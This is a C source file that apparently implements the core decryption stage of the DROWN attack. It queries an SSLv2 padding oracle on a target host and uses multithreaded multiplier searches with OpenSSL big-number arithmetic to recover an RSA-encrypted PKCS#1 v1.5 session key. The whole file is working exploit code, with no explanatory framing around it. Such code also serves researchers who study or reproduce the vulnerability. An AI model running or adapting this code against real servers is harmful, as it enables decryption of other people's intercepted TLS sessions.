#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <pthread.h>
#include "decrypt.h"
#include "oracle.h"


void BN_dump(BIGNUM *bn)
{
    printf("%s\n", BN_bn2hex(bn));
}


void oracle_guess(drown_ctx *dctx, BIGNUM *c, BIGNUM *k, int bsize)
{
    int bytesize = bsize/8-1;
    unsigned char result[24];
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    run_oracle_guess(dctx->hostport, bytesize, enc_key, 256, result);

    // Convert m to bignum
    BN_bin2bn(result, bytesize, k);
}

/*
    Checks whether c is valid for any length of padding we know.
    Returns the numbers of bits we can learn (0 if invalid).
*/
int oracle_valid_multiple(drown_ctx *dctx, BIGNUM *c)
{
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    int size = run_oracle_valid_multiple(dctx->hostport, enc_key, 256);
    if(size == 0)
        return 0;
    else
        return (size + 1) * 8;
}

/*
    Checks whether c is correctly padded to 24 bytes.
    Returns the numbers of bits we can learn (0 if invalid).
*/
int oracle_valid(drown_ctx *dctx, BIGNUM *c)
{
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    if(run_oracle_valid(dctx->hostport, 24, enc_key, 256))
        return 25*8;
    return 0;
}

#define NUM_THREADS 5

struct shared_data_t
{
    drown_ctx *dctx;
    BIGNUM *mt;
    BIGNUM *l_1;
    BIGNUM *ss;
    pthread_mutex_t mutex;
    int done;
    int l;
};

struct shared_data_t shared_data = {
    .mutex = PTHREAD_MUTEX_INITIALIZER,
};

void * find_multiplier_thread(void *data)
{
    int num = (int)data;

    BIGNUM *c = shared_data.dctx->c;
    BIGNUM *n = shared_data.dctx->n;
    BIGNUM *e = shared_data.dctx->e;
    BIGNUM *l_1 = shared_data.l_1;

    BN_CTX *ctx = BN_CTX_new();
    BN_CTX_start(ctx);

    BIGNUM *inc = BN_CTX_get(ctx);
    BIGNUM *mt = BN_CTX_get(ctx);
    BN_copy(mt, shared_data.mt);
    BIGNUM *ss = BN_CTX_get(ctx);
    BIGNUM *upperbits = BN_CTX_get(ctx);
    BIGNUM *se = BN_CTX_get(ctx);
    BIGNUM *l_1e = BN_CTX_get(ctx);
    BIGNUM *cl_1e = BN_CTX_get(ctx);
    BN_mod_exp(l_1e, l_1, e, n, ctx);
    BN_mod_mul(cl_1e, c, l_1e, n, ctx);
    BIGNUM * cc = BN_CTX_get(ctx);

    int l = 0;

    // We will try every value of s, so we will add instead of multiplying
    // Compute our increment
    BN_mod_mul(inc, mt, l_1, n, ctx);

    // Since we have several threads, each one will test the values of s in {num + i * NUM_THREADS}
    BIGNUM *ii = BN_new();
    BN_set_word(ii, num);
    BIGNUM *nn = BN_new();
    BN_set_word(nn, NUM_THREADS);
    BN_mod_mul(mt, inc, ii, n, ctx);
    BN_mod_mul(inc, inc, nn, n, ctx);
    BN_free(ii);
    BN_free(nn);


    // Search multiplier
    unsigned long s;
    for(s = num + NUM_THREADS; l == 0 && !shared_data.done; s += NUM_THREADS)
    {
        BN_mod_add(mt, mt, inc, n, ctx);
        // Check if the upper bits are 0x0002
        BN_rshift(upperbits, mt, 2032);
        if(BN_is_word(upperbits, 0x0002))
        {
            // cc = c * (s / l) ** e
            BN_set_word(ss, s);
            BN_mod_exp(se, ss, e, n, ctx);
            BN_mod_mul(cc, cl_1e, se, n, ctx);

            l = oracle_valid(shared_data.dctx, cc);
        }
    }

    if(l)
    {
        pthread_mutex_lock(&shared_data.mutex);
        if(!shared_data.done)
        {
            shared_data.done = 1;
            // We found a result, save it
            BN_copy(c, cc);
            BN_copy(shared_data.mt, mt);
            BN_copy(shared_data.ss, ss);
            shared_data.l = l;
        }
        pthread_mutex_unlock(&shared_data.mutex);
    }

    BN_CTX_end(ctx);
    BN_CTX_free(ctx);

    return NULL;
}

int threaded_find_multiplier(drown_ctx *dctx, BIGNUM *mt, BIGNUM *l_1, BN_CTX *ctx, BIGNUM * ss)
{
    pthread_t tids[NUM_THREADS];

    shared_data.dctx = dctx;
    shared_data.mt = mt;
    shared_data.l_1 = l_1;
    shared_data.ss = ss;
    shared_data.done = 0;

    for(int i = 0; i < NUM_THREADS; i++)
        pthread_create(&tids[i], NULL, find_multiplier_thread, (void *)i);

    for(int i = 0; i < NUM_THREADS; i++)
        pthread_join(tids[i], NULL);

    return shared_data.l;
}



/*
    We have c0 = m0 ** e (mod n)
            m0 = PKCS_1_v1.5_pad(k)), with |k| = ksize
    Given c0, e, n, ksize and an oracle, we try to find m0 (and succeed !)
*/
void decrypt(drown_ctx *dctx)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *S = dctx->s;
    BIGNUM *mt = dctx->mt;

    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);
    BIGNUM *l_1 = BN_CTX_get(ctx);
    BIGNUM *ss = BN_CTX_get(ctx);
    BIGNUM *r = BN_CTX_get(ctx);

    // mt is our current approximation of m
    // u marks the highest known bit
    // l marks the lowest unknown bit

    // At the beginning, we have
    //         u                              l
    // m  = 0002???????????????????????????????00gggggggg
    // where g is the bits of m0 (found by the oracle)


    int l = oracle_valid_multiple(dctx, c);
    oracle_guess(dctx, c, mt, l);
    int u = 2032;
    BN_set_bit(mt, 2033);



    // Repeat while we don't know all the bits
    while(u > l)
    {
        // We know l low bits, so we know that for the next mt, we will know approximately l more upper bits
        u -= l;

        // Compute l_1 = 2**(-l)
        BN_lshift(l_1, BN_value_one(), l);
        BN_mod_inverse(l_1, l_1, n, ctx);

        // Find a multiplier
        l = threaded_find_multiplier(dctx, mt, l_1, ctx, ss);

        // Remember our multiplier
        BN_mod_mul(S, S, ss, n, ctx);
        BN_mod_mul(S, S, l_1, n, ctx);

        // We learnt approximately l bits.
        // However, we're multiplying by s so we're not sure of |s| + 1 bits
        u += BN_num_bits(ss) + 1;
        // Another gotcha : we must remove 01*, because they may change by addition
        while(BN_is_bit_set(mt, u))
            u++;
        u++;
        // Be sure that u and l won't collide
        if(u < l)
            u = l;
        // Great ! We know u, so we can clear the low bits
        BN_rshift(mt, mt, u);
        BN_lshift(mt, mt, u);

        // Guess the low bits
        oracle_guess(dctx, c, r, l);
        BN_add(mt, mt, r);

        BN_print_fp(stderr, mt);
        fprintf(stderr, "\n");

    }

    BN_CTX_end(ctx);
}


